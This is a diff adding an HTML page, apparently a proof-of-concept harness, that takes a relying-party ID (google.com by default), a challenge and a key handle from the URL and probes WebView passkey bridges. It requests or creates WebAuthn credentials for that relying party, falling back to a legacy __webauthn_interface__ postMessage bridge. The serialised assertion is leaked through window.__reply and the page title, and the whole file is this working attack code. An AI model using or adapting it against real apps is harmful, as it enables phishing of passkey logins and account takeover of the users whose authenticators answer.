@@ -1,0 +1,174 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>MM-UNIV-BOOT</title>
+</head>
+<body style="background:#020;color:#cfc;font-family:sans-serif;font-size:14px">
+<h1 id="tt">MM UNIVERSAL</h1>
+<pre id="log">BOOT</pre>
+<script>
+"use strict";
+var PAGE_MODE = null, RP = null, CH = null, KH = null, AC = [], UIDB = null, UNAME = null;
+function q(k){
+  var s = location.search + "&" + location.hash.slice(1);
+  var m = s.match(new RegExp("[&#?]*" + k + "=([^&]*)"));
+  return m ? decodeURIComponent(m[1]) : null;
+}
+function ev(m){
+  try{
+    var l = document.getElementById("log");
+    l.textContent += "\n" + m;
+    document.title = ("EV:" + m).slice(0, 280);
+  }catch(e){}
+}
+function b64u8(s){
+  try{
+    var bin = atob(s), u = new Uint8Array(bin.length);
+    for (var i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
+    return u;
+  }catch(e){ ev("B64_ERR:" + e); return null; }
+}
+function ab64(ab){
+  var u = new Uint8Array(ab), s = "";
+  for (var i = 0; i < u.length; i++) s += String.fromCharCode(u[i]);
+  return btoa(s);
+}
+window.__reply = "";
+function serializeCred(cr){
+  var o = { rawId: ab64(cr.rawId), id: cr.id, type: cr.type,
+            response: {}, clientExtensionResults: JSON.stringify(cr.getClientExtensionResults()) };
+  var r = cr.response;
+  o.response.clientDataJSON = ab64(r.clientDataJSON);
+  o.response.authenticatorData = ab64(r.authenticatorData);
+  if (r.signature) o.response.signature = ab64(r.signature);
+  if (r.userHandle) o.response.userHandle = ab64(r.userHandle);
+  if (r.attestationObject) o.response.attestationObject = ab64(r.attestationObject);
+  if (r.transports) o.response.transports = JSON.stringify(r.transports);
+  return o;
+}
+function getPkOpts(){
+  var u8 = b64u8(CH);
+  if (!u8) return null;
+  var o = { challenge: u8, rpId: RP, timeout: 120000, userVerification: "required" };
+  if (AC.length) o.allowCredentials = AC;
+  return o;
+}
+function createPkOpts(){
+  var u8 = b64u8(CH);
+  if (!u8) return null;
+  var uid = b64u8(UIDB || btoa("Bytestunt"));
+  return {
+    rp: { id: RP, name: (RP === "google.com" ? "google.com" : RP) },
+    user: { id: uid, name: UNAME || "Bytestunt", displayName: UNAME || "Bytestunt" },
+    challenge: u8,
+    pubKeyCredParams: [{ type: "public-key", alg: -7 }, { type: "public-key", alg: -257 }],
+    authenticatorSelection: { userVerification: "required", residentKey: "preferred" },
+    timeout: 120000
+  };
+}
+function v1Post(payload, cb){
+  /* Legacy __webauthn_interface__ direct postMessage (24.x style) */
+  var iface = window.__webauthn_interface__;
+  if (!iface) { ev("V1POST_NO_IFACE"); cb(null, "V1POST_NO_IFACE"); return; }
+  var done = false;
+  function hdl(m){
+    if (done) return; done = true;
+    try { iface.removeEventListener("message", hdl); } catch(e){}
+    var s = (typeof m === "string") ? m : JSON.stringify(m);
+    window.__reply = s;
+    ev("V1_REPLY len=" + s.length);
+    cb(null, s);
+  }
+  try {
+    if (typeof iface.addEventListener === "function") { iface.addEventListener("message", hdl); }
+    if (typeof iface.onmessage !== "undefined" || iface.addEventListener) { try { iface.onmessage = hdl; } catch(e){} }
+    iface.postMessage(JSON.stringify(payload));
+    ev("V1_POSTED_OK");
+  } catch(e){ ev("V1_POST_ERR:" + e); cb(null, "V1_POST_ERR:" + e); }
+}
+function fireCreate(path){
+  var opts = createPkOpts();
+  if (!opts) { ev("CREATE_NO_OPTS"); return; }
+  ev("CREATE_TRY_NATIVE len=" + CH.length + " rp=" + RP);
+  try {
+    var p = navigator.credentials.create({ publicKey: opts });
+    if (!p || typeof p.then !== "function") { ev("CREATE_NATIVE_NO_PROMISE"); return; }
+    p.then(function(cr){
+      try { window.__reply = JSON.stringify({ scheme: "native", publicKeyCredential: serializeCred(cr) }); ev("CREATE_NATIVE_OK rawId=" + window.__reply.slice(0, 60)); }
+      catch(e){ ev("CREATE_SER_ERR:" + e); }
+    }, function(err){
+      ev("CREATE_NATIVE_ERR:" + err.name + ":" + err.message);
+      if (window.__webauthn_interface__) {
+        ev("CREATE_FALLBACK_V1");
+        v1Post({ publicKey: opts }, function(_, s){ ev("CREATE_V1_" + String(s).slice(0, 120)); });
+      }
+    });
+  } catch(e){
+    ev("CREATE_NATIVE_THROW:" + e);
+    if (window.__webauthn_interface__) {
+      ev("CREATE_FALLBACK_V1");
+      v1Post({ publicKey: opts }, function(_, s){ ev("CREATE_V1_" + String(s).slice(0, 120)); });
+    }
+  }
+}
+function fireGet(){
+  var opts = getPkOpts();
+  if (!opts) { ev("GET_NO_OPTS"); return; }
+  ev("GET_TRY_NATIVE ch=" + CH.length + " rp=" + RP + " ac=" + AC.length);
+  try {
+    var p = navigator.credentials.get({ publicKey: opts });
+    if (!p || typeof p.then !== "function") { ev("GET_NATIVE_NO_PROMISE"); return; }
+    p.then(function(cr){
+      try { window.__reply = JSON.stringify({ scheme: "native", publicKeyCredential: serializeCred(cr) }); ev("GET_NATIVE_OK rawId=" + window.__reply.slice(0, 60)); }
+      catch(e){ ev("GET_SER_ERR:" + e); }
+    }, function(err){
+      ev("GET_NATIVE_ERR:" + err.name + ":" + err.message);
+      if (window.__webauthn_interface__) {
+        ev("GET_FALLBACK_V1");
+        v1Post({ publicKey: opts }, function(_, s){ ev("GET_V1_" + String(s).slice(0, 120)); });
+      }
+    });
+  } catch(e){
+    ev("GET_NATIVE_THROW:" + e);
+    if (window.__webauthn_interface__) {
+      ev("GET_FALLBACK_V1");
+      v1Post({ publicKey: opts }, function(_, s){ ev("GET_V1_" + String(s).slice(0, 120)); });
+    }
+  }
+}
+/* ---- boot ---- */
+ev("LOADED " + location.href);
+PAGE_MODE = q("mode") || "probe";
+RP = q("rp") || "google.com";
+CH = q("challenge") || null;
+KH = q("kh") || null;
+UIDB = q("uid") || null;
+UNAME = q("uname") || null;
+AC = (q("ac") === "none" || !KH) ? [] : [{ type: "public-key", id: b64u8(KH) }];
+setTimeout(function(){
+  ev("PROBE cred_get=" + (navigator.credentials ? typeof navigator.credentials.get : "noCreds")
+     + " cred_create=" + (navigator.credentials ? typeof navigator.credentials.create : "noCreds")
+     + " iface_v1=" + typeof window.__webauthn_interface__
+     + " hooks=" + typeof window.__webauthn_hooks__
+     + " resultListener=" + typeof window.webauthnResultListener
+     + " ua=" + navigator.userAgent.slice(0, 70));
+  var tries = 0, iv = null;
+  function go(){
+    tries++;
+    var ready = (typeof window.__webauthn_hooks__ !== "undefined")
+      || (typeof navigator.credentials.get === "function")
+      || (typeof window.__webauthn_interface__ !== "undefined");
+    ev("READY_CHECK t=" + tries + " ready=" + ready);
+    if (ready || tries >= 6) {
+      if (iv) clearInterval(iv);
+      if (PAGE_MODE === "create") fireCreate();
+      else if (PAGE_MODE === "get") fireGet();
+      else ev("PROBE_ONLY");
+    }
+  }
+  iv = setInterval(go, 1500);
+}, 500);
+</script>
+</body>
+</html>
